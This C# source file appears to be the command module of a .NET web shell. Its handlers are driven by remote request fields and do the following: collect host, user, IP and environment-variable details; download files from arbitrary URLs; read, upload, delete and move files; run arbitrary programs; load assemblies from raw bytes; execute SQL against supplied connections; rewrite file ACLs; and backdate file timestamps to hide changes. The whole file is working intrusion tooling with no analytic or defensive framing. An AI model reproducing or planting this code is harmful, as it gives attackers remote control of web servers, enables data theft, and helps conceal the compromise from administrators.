using System;
using System.Collections;
using System.Collections.Generic;
using System.Data;
using System.Data.SqlClient;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;

namespace Nx
{
	internal static class Job
	{
		public static byte[] Info(LY h)
		{
			string text = "";
			string arg = string.Join(";", Environment.GetLogicalDrives()) + ";";
			text += string.Format("{0} : {1}\n", "FileRoot", arg);
			text += string.Format("{0} : {1}\n", "CurrentDir", Environment.CurrentDirectory);
			try
			{
				string ver2 = "2.0.0.0, Culture=neutral, PublicKeyToken=";
				string an = "System.Web, Version=" + ver2 + "b03f5f7f11d50a3a";
				string pfx = "System.";
				string tn = pfx + "Web." + "HttpContext";
				object cv = Assembly.Load(an).GetType(tn).GetProperty("Current").GetValue(null, new object[0]);
				object sv = cv.GetType().GetProperty("Server").GetValue(cv, new object[0]);
				string wd = (string)sv.GetType().GetMethod("MapPath", new Type[1] { typeof(string) }).Invoke(sv, new object[1] { "." });
				text += string.Format("{0} : {1}\n", "CurrentWebDir", wd);
			}
			catch (Exception)
			{
			}
			try
			{
				text += string.Format("{0} : {1}\n", "AssemblyLocation", typeof(LY).Assembly.Location);
				text += string.Format("{0} : {1}\n", "AssemblyCodeBase", typeof(LY).Assembly.CodeBase);
			}
			catch (Exception)
			{
			}
			text += string.Format("{0} : {1}\n", "OsInfo", Environment.OSVersion);
			text += string.Format("{0} : {1}\n", "CurrentUser", Environment.UserName);
			text += string.Format("{0} : {1}\n", "ProcessArch", (IntPtr.Size == 8) ? "x64" : "x86");
			try
			{
				string tp = Path.GetTempPath();
				if (!tp.EndsWith("\\") && !tp.EndsWith("/"))
				{
					tp += Path.PathSeparator;
				}
				text += string.Format("{0} : {1}\n", "TempDirectory", tp);
			}
			catch (Exception)
			{
				text += string.Format("{0} : {1}\n", "TempDirectory", "c:/windows/temp/");
			}
			text += string.Format("{0} : {1}\n", "IPList", Resolve());
			PropertyInfo[] props = typeof(Environment).GetProperties(BindingFlags.Static | BindingFlags.Public);
			for (int i = 0; i < props.Length; i++)
			{
				string pn = props[i].Name;
				if (!"StackTrace".Equals(pn) && !"NewLine".Equals(pn))
				{
					text += string.Format("{0} : {1}\n", pn, props[i].GetValue(null, null));
				}
			}
			try
			{
				IDictionary env = Environment.GetEnvironmentVariables();
				foreach (object k in env.Keys)
				{
					text += string.Format("{0} : {1}\n", k, env[k]);
				}
			}
			catch (Exception ex)
			{
				text = text + ex.Message + "\n";
			}
			return Encoding.Default.GetBytes(text);
		}

		public static byte[] Test(LY h)
		{
			Hashtable ht = new Hashtable();
			string t = Top.S(h, "sessionId");
			if (h.ctx == null)
			{
				t = Guid.NewGuid().ToString().Replace("-", "").Substring(16);
				h.ctx = new Hashtable();
				h.ctx["alive"] = true;
				LY.cache[t] = h.ctx;
			}
			ht.Add("sessionId", t);
			return Top.Pack(ht);
		}

		public static byte[] SetAttr(LY h)
		{
			string type = Top.S(h, "type");
			string attr = Top.S(h, "attr");
			string fn = Top.S(h, "fileName");
			string r = "Null";
			if (type != null && attr != null && fn != null)
			{
				try
				{
					if ("fileBasicAttr".Equals(type))
					{
						r = ToggleBasic(fn, attr);
					}
					else if ("fileTimeAttr".Equals(type))
					{
						r = ResetTime(fn, attr);
					}
					else
					{
						r = "unsupported attribute mode";
					}
				}
				catch (Exception ex)
				{
					r = ex.Message;
				}
			}
			else
			{
				r = "bad attribute request";
			}
			return Top.Tb(r);
		}

		public static byte[] Down(LY h)
		{
			string url = Top.S(h, "url");
			string save = Top.S(h, "saveFile");
			string r = "Null";
			if (url != null && save != null)
			{
				try
				{
					new WebClient().DownloadFile(url, save);
					r = "ok";
				}
				catch (Exception ex)
				{
					r = ex.Message;
				}
			}
			else
			{
				r = "missing fetch fields";
			}
			return Top.Tb(r);
		}

		public static byte[] Del(LY h)
		{
			string fn = Top.S(h, "fileName");
			if (fn != null && fn.Trim().Length > 0)
			{
				if (fn.StartsWith("mem://"))
				{
					h.ctx.Remove(fn);
					return Top.Tb("ok");
				}
				try
				{
					if (File.GetAttributes(fn) == FileAttributes.Directory)
					{
						Directory.Delete(fn, true);
					}
					else
					{
						File.Delete(fn);
					}
					return Top.Tb("ok");
				}
				catch (Exception ex)
				{
					return Top.Tb(ex.Message);
				}
			}
			return Top.Tb("missing path");
		}

		public static byte[] Copy(LY h)
		{
			string s = Top.S(h, "srcFileName");
			string d = Top.S(h, "destFileName");
			if (s != null && d != null)
			{
				if (File.Exists(s))
				{
					if (File.Exists(d))
					{
						File.Delete(d);
					}
					File.Copy(s, d, true);
					return Top.Tb("ok");
				}
				return Top.Tb("target path invalid");
			}
			return Top.Tb("missing copy fields");
		}

		public static byte[] Move(LY h)
		{
			string s = Top.S(h, "srcFileName");
			string d = Top.S(h, "destFileName");
			if (s != null && d != null && s.Trim().Length > 0 && d.Trim().Length > 0)
			{
				try
				{
					if (File.Exists(s))
					{
						File.Move(s, d);
						return Top.Tb("ok");
					}
					if (Directory.Exists(s))
					{
						Directory.Move(s, d);
						return Top.Tb("ok");
					}
					return Top.Tb("target missing");
				}
				catch (Exception ex)
				{
					return Top.Tb(ex.Message);
				}
			}
			return Top.Tb("missing copy fields");
		}

		public static byte[] NewF(LY h)
		{
			string fn = Top.S(h, "fileName");
			if (fn != null && fn.Trim().Length > 0)
			{
				try
				{
					if (!File.Exists(fn))
					{
						try
						{
							File.Create(fn).Close();
							return Top.Tb("ok");
						}
						catch (Exception ex)
						{
							return Top.Tb(ex.Message);
						}
					}
					return Top.Tb("path exists");
				}
				catch (Exception ex2)
				{
					return Top.Tb(ex2.Message);
				}
			}
			return Top.Tb("missing path");
		}

		public static byte[] NewD(LY h)
		{
			string dn = Top.S(h, "dirName");
			if (dn != null && dn.Trim().Length > 0)
			{
				try
				{
					if (!Directory.Exists(dn))
					{
						try
						{
							Directory.CreateDirectory(dn);
							return Top.Tb("ok");
						}
						catch (Exception ex)
						{
							return Top.Tb(ex.Message);
						}
					}
					return Top.Tb("directory exists");
				}
				catch (Exception ex2)
				{
					return Top.Tb(ex2.Message);
				}
			}
			return Top.Tb("missing path");
		}

		public static byte[] Read(LY h)
		{
			string fn = Top.S(h, "fileName");
			if (fn != null && fn.Trim().Length > 0)
			{
				try
				{
					if (File.Exists(fn))
					{
						byte[] buf = new byte[(int)new FileInfo(fn).Length];
						int got = 0;
						FileStream fs = new FileStream(fn, FileMode.Open, FileAccess.Read, FileShare.Read);
						while ((got += fs.Read(buf, got, buf.Length - got)) < buf.Length)
						{
						}
						fs.Close();
						return buf;
					}
					return Top.Tb("path absent");
				}
				catch (Exception ex)
				{
					return Top.Tb(ex.Message);
				}
			}
			return Top.Tb("missing path");
		}

		public static byte[] Browse(LY h)
		{
			Hashtable ht = new Hashtable();
			string dir = Top.S(h, "dirName");
			if (dir != null && dir.Length > 0)
			{
				dir += "/";
				try
				{
					DirectoryInfo di = new DirectoryInfo(dir);
					FileInfo[] files = di.GetFiles();
					DirectoryInfo[] dirs = di.GetDirectories();
					ht["currentDir"] = di.FullName;
					int n = 0;
					for (int i = 0; i < dirs.Length; i++)
					{
						Hashtable sub = new Hashtable();
						try
						{
							sub["0"] = dirs[i].Name;
							sub["1"] = 0;
							sub["2"] = dirs[i].LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss");
							sub["3"] = 4096;
							sub["4"] = RwxStr(dirs[i].FullName);
						}
						catch (Exception ex)
						{
							sub["errMsg"] = ex.Message;
						}
						ht[n.ToString()] = sub;
						n++;
					}
					for (int j = 0; j < files.Length; j++)
					{
						Hashtable sub = new Hashtable();
						try
						{
							sub["0"] = files[j].Name;
							sub["1"] = 1;
							sub["2"] = files[j].LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss");
							sub["3"] = files[j].Length;
							sub["4"] = RwxStr(files[j].FullName);
						}
						catch (Exception ex2)
						{
							sub["errMsg"] = ex2.Message;
						}
						ht[n.ToString()] = sub;
						n++;
					}
					ht["count"] = n.ToString();
				}
				catch (Exception ex3)
				{
					ht["errMsg"] = ex3.Message;
				}
			}
			else
			{
				ht["errMsg"] = "missing directory";
			}
			return Top.Pack(ht);
		}

		public static byte[] Load(LY h)
		{
			byte[] bin = Top.B(h, "binCode");
			string name = Top.S(h, "codeName");
			string asn = Top.S(h, "assemblyName");
			if (asn != null)
			{
				Assembly a = Assembly.Load(asn);
				h.ctx[name] = a;
				return Top.Tb("ok");
			}
			try
			{
				if (bin != null && name != null)
				{
					try
					{
						Assembly a = Assembly.Load(bin);
						if (a != null)
						{
							h.ctx[name] = a;
							return Top.Tb("ok");
						}
						return Top.Tb("module missing");
					}
					catch (Exception ex)
					{
						return Top.Tb(ex.Message);
					}
				}
				return Top.Tb("missing module fields");
			}
			catch (Exception ex2)
			{
				return Top.Tb(ex2.Message);
			}
		}

		public static byte[] Exec(LY h)
		{
			string exe = Top.S(h, "executableFile");
			if (exe != null && exe.Length > 0)
			{
				try
				{
					string args = Top.S(h, "executableArgs");
					Process p = new Process();
					p.StartInfo.FileName = exe;
					p.StartInfo.UseShellExecute = false;
					p.StartInfo.RedirectStandardError = true;
					p.StartInfo.RedirectStandardInput = true;
					p.StartInfo.RedirectStandardOutput = true;
					p.StartInfo.CreateNoWindow = true;
					if (args != null)
					{
						p.StartInfo.Arguments = args;
					}
					try
					{
						try
						{
							p.Start();
						}
						catch (Exception ex)
						{
							return Top.Tb(string.Format("launch failure:{0}", ex.Message));
						}
						p.StandardInput.AutoFlush = true;
						string r = p.StandardOutput.ReadToEnd();
						r += p.StandardError.ReadToEnd();
						p.WaitForExit();
						p.Close();
						return Top.Tb(r);
					}
					catch (Exception ex2)
					{
						return Top.Tb(string.Format("runtime fault:{0}", ex2.Message));
					}
				}
				catch (Exception ex3)
				{
					return Top.Tb(ex3.Message);
				}
			}
			return Top.Tb("no command path");
		}

		public static byte[] Sql(LY h)
		{
			string db = Top.S(h, "dbType");
			string cs = Top.S(h, "dbCharset");
			string conn = Top.S(h, "connectString");
			string drv = Top.S(h, "dbDriver");
			string un = Top.S(h, "dbUsername");
			string pw = Top.S(h, "dbPassword");
			string et = Top.S(h, "execType");
			byte[] sqlb = Top.B(h, "execSql");
			Hashtable outt = new Hashtable();
			if (db != null && cs != null && conn != null && drv != null && un != null && pw != null && et != null && sqlb != null)
			{
				try
				{
					string sql = Encoding.GetEncoding(cs).GetString(sqlb);
					Type ty = typeof(SqlConnection);
					if (!drv.Equals(ty.FullName))
					{
						ty = null;
						List<Assembly> list = new List<Assembly>();
						try
						{
							if (h.ctx.ContainsKey(db) && h.ctx[db] is Assembly)
							{
								list.Add((Assembly)h.ctx[db]);
							}
						}
						catch (Exception)
						{
						}
						list.AddRange(AppDomain.CurrentDomain.GetAssemblies());
						foreach (Assembly a in list)
						{
							try
							{
								Type t2 = a.GetType(drv);
								if (t2 != null && typeof(IDbConnection).IsAssignableFrom(t2))
								{
									ty = t2;
									break;
								}
							}
							catch (Exception)
							{
							}
						}
					}
					if (ty != null)
					{
						try
						{
							IDbConnection con = (IDbConnection)ty.GetConstructor(new Type[0]).Invoke(new object[0]);
							con.ConnectionString = conn;
							con.Open();
							if (et.Equals("select"))
							{
								IDbCommand cmd = con.CreateCommand();
								cmd.CommandText = sql;
								IDataReader rd = cmd.ExecuteReader();
								Hashtable cols = new Hashtable();
								for (int i = 0; i < rd.FieldCount; i++)
								{
									cols[i.ToString()] = rd.GetName(i);
								}
								cols["count"] = cols.Count.ToString();
								outt["column"] = cols;
								Hashtable rows = new Hashtable();
								int n = 0;
								while (rd.Read())
								{
									Hashtable row = new Hashtable();
									for (int j = 0; j < rd.FieldCount; j++)
									{
										object v = rd.GetValue(j);
										string sv = "null";
										if (v is byte[])
										{
											sv = Convert.ToBase64String((byte[])v);
										}
										else if (v != null)
										{
											sv = v.ToString();
										}
										row[j.ToString()] = sv;
									}
									rows[n.ToString()] = row;
									n++;
								}
								rows["count"] = rows.Count.ToString();
								outt["rows"] = rows;
								cmd.Dispose();
								con.Dispose();
							}
							else
							{
								IDbCommand cmd = con.CreateCommand();
								int n = cmd.ExecuteNonQuery();
								cmd.Dispose();
								con.Dispose();
								outt["errMsg"] = n + " row(s) touched";
							}
						}
						catch (Exception ex4)
						{
							return Top.Tb(ex4.Message);
						}
					}
					else
					{
						outt["errMsg"] = "no database provider";
					}
				}
				catch (Exception ex5)
				{
					outt["errMsg"] = ex5.Message;
				}
			}
			else
			{
				outt["errMsg"] = "missing database fields";
			}
			return Top.Pack(outt);
		}

		public static byte[] Up(LY h)
		{
			string fn = Top.S(h, "fileName");
			byte[] data = Top.B(h, "fileValue");
			if (fn != null && data != null)
			{
				try
				{
					FileStream fs = new FileStream(fn, FileMode.OpenOrCreate, FileAccess.Write, FileShare.Write);
					fs.Write(data, 0, data.Length);
					fs.Close();
					return Top.Tb("ok");
				}
				catch (Exception ex)
				{
					return Top.Tb(ex.Message);
				}
			}
			return Top.Tb("missing upload fields");
		}

		public static byte[] Close(LY h)
		{
			try
			{
				string sid = Top.S(h, "sessionId");
				byte[] op = Top.B(h, "operation");
				if (sid != null)
				{
					h.ctx["alive"] = false;
					LY.cache.Remove(sid);
					return Top.Tb("ok");
				}
				if (op != null && "clearup".Equals(Encoding.Default.GetString(op)))
				{
					IEnumerator en = LY.cache.Values.GetEnumerator();
					while (en.MoveNext())
					{
						object c = en.Current;
						if (c is Hashtable)
						{
							((Hashtable)c)["alive"] = false;
						}
					}
					LY.cache.Clear();
					return Top.Tb("ok");
				}
				return Top.Tb("fail");
			}
			catch (Exception ex)
			{
				return Top.Tb(ex.Message);
			}
		}

		public static byte[] BUp(LY h)
		{
			string fn = Top.S(h, "fileName");
			byte[] data = Top.B(h, "fileContents");
			long pos = Convert.ToInt64(Top.S(h, "position"));
			bool disk = true;
			Stream s;
			if (fn.StartsWith("mem://"))
			{
				if (pos == 0L)
				{
					h.ctx[fn] = new MemoryStream();
				}
				s = (Stream)h.ctx[fn];
				disk = false;
			}
			else
			{
				s = new FileStream(fn, FileMode.OpenOrCreate, FileAccess.Write);
			}
			s.Seek(pos, SeekOrigin.Begin);
			s.Write(data, 0, data.Length);
			s.Flush();
			if (disk)
			{
				s.Close();
			}
			return Top.Tb("ok");
		}

		public static byte[] BDn(LY h)
		{
			string fn = Top.S(h, "fileName");
			string mode = Top.S(h, "mode");
			string rn = Top.S(h, "readByteNum");
			string pos = Top.S(h, "position");
			try
			{
				if ("fileSize".Equals(mode))
				{
					return Top.Tb(new FileInfo(fn).Length.ToString());
				}
				if ("read".Equals(mode))
				{
					Stream s = null;
					if (fn.StartsWith("mem://"))
					{
						s = (Stream)h.ctx[fn];
						if (s == null)
						{
							return Top.Tb("no stream buffer");
						}
					}
					else
					{
						s = new FileStream(fn, FileMode.Open, FileAccess.Read);
					}
					long off = Convert.ToInt64(pos);
					byte[] buf = new byte[Convert.ToInt32(rn)];
					s.Seek(off, SeekOrigin.Begin);
					int got = s.Read(buf, 0, buf.Length);
					s.Close();
					if (got == buf.Length)
					{
						return buf;
					}
					byte[] part = new byte[got];
					Array.Copy(buf, part, got);
					return part;
				}
				return Top.Tb("mode unsupported");
			}
			catch (Exception ex)
			{
				return Top.Tb(ex.Message);
			}
		}

		private static int Rwx(string fn)
		{
			int f = 7;
			try
			{
				foreach (FileSystemAccessRule ar in new DirectoryInfo(fn).GetAccessControl().GetAccessRules(true, true, typeof(NTAccount)))
				{
					if (ar.AccessControlType == AccessControlType.Deny)
					{
						FileSystemRights rt = ar.FileSystemRights;
						if ((rt & FileSystemRights.Read) != 0)
						{
							f &= ~4;
						}
						if ((rt & FileSystemRights.Write) != 0)
						{
							f &= ~2;
						}
						if ((rt & FileSystemRights.ExecuteFile) != 0)
						{
							f &= ~1;
						}
					}
				}
			}
			catch (Exception)
			{
			}
			return f;
		}

		private static string RwxStr(string fn)
		{
			int f = Rwx(fn);
			string s = "";
			if ((f & 4) != 0)
			{
				s += "R";
			}
			if ((f & 2) != 0)
			{
				s += "W";
			}
			if ((f & 1) != 0)
			{
				s += "X";
			}
			if (s.Length == 0)
			{
				return "F";
			}
			return s;
		}

		private static void WriteAcl(string fn, IdentityReference account, string rights)
		{
			FileSystemRights allow = (FileSystemRights)0;
			if (rights.IndexOf("R") != -1)
			{
				allow |= FileSystemRights.ReadData;
			}
			if (rights.IndexOf("W") != -1)
			{
				allow |= FileSystemRights.Write;
			}
			if (rights.IndexOf("X") != -1)
			{
				allow = ((rights.IndexOf("R") == -1) ? (allow | FileSystemRights.ReadAndExecute) : (allow | FileSystemRights.ExecuteFile));
			}
			FileSystemRights deny = (FileSystemRights)0;
			if (rights.IndexOf("R") == -1)
			{
				deny |= FileSystemRights.Read;
			}
			if (rights.IndexOf("W") == -1)
			{
				deny |= FileSystemRights.Write;
			}
			if (rights.IndexOf("X") == -1)
			{
				deny |= FileSystemRights.ExecuteFile;
			}
			DirectoryInfo di = new DirectoryInfo(fn);
			DirectorySecurity sec = di.GetAccessControl();
			InheritanceFlags inh = InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit;
			bool mod;
			if (allow != 0)
			{
				FileSystemAccessRule rule = new FileSystemAccessRule(account, allow, inh, PropagationFlags.None, AccessControlType.Allow);
				sec.ModifyAccessRule(AccessControlModification.Reset, rule, out mod);
			}
			if (deny != 0)
			{
				FileSystemAccessRule rule2 = new FileSystemAccessRule(account, deny, inh, PropagationFlags.None, AccessControlType.Deny);
				sec.ModifyAccessRule(AccessControlModification.Reset, rule2, out mod);
			}
			di.SetAccessControl(sec);
		}

		public static string ToggleBasic(string fn, string rights)
		{
			DirectoryInfo di = null;
			int cnt = 0;
			string err = null;
			try
			{
				di = new DirectoryInfo(fn);
				AuthorizationRuleCollection rules = di.GetAccessControl(AccessControlSections.Access).GetAccessRules(true, true, typeof(NTAccount));
				foreach (FileSystemAccessRule r in rules)
				{
					try
					{
						WriteAcl(fn, r.IdentityReference, rights);
						cnt++;
					}
					catch (Exception ex)
					{
						err = ex.Message;
					}
				}
			}
			catch (Exception ex2)
			{
				return ex2.Message;
			}
			if (cnt > 0)
			{
				int f = Rwx(fn);
				if ((f & 2) != 0)
				{
					di.Attributes = FileAttributes.Normal;
				}
				else if ((f & 4) == 0)
				{
					di.Attributes = FileAttributes.ReadOnly;
				}
				return "ok";
			}
			if (err != null)
			{
				return err;
			}
			return "fail";
		}

		public static string ResetTime(string fn, string ts)
		{
			try
			{
				DateTime dt = TimeZone.CurrentTimeZone.ToLocalTime(new DateTime(1970, 1, 1)).AddSeconds(long.Parse(ts));
				File.SetLastAccessTime(fn, dt);
				File.SetCreationTime(fn, dt);
				File.SetLastWriteTime(fn, dt);
				return "ok";
			}
			catch (Exception ex)
			{
				return ex.Message;
			}
		}

		public static string Resolve()
		{
			StringBuilder sb = new StringBuilder("[");
			ArrayList seen = new ArrayList();
			try
			{
				IPAddress[] ips = Dns.GetHostAddresses(Dns.GetHostName());
				foreach (IPAddress ip in ips)
				{
					string t = ip.ToString();
					if (!seen.Contains(t))
					{
						seen.Add(t);
						sb.Append(t + ",");
					}
				}
				sb.Remove(sb.Length - 1, 1);
			}
			catch (Exception ex)
			{
				sb.Append(ex.Message);
			}
			sb.Append("]");
			return sb.ToString();
		}
	}
}
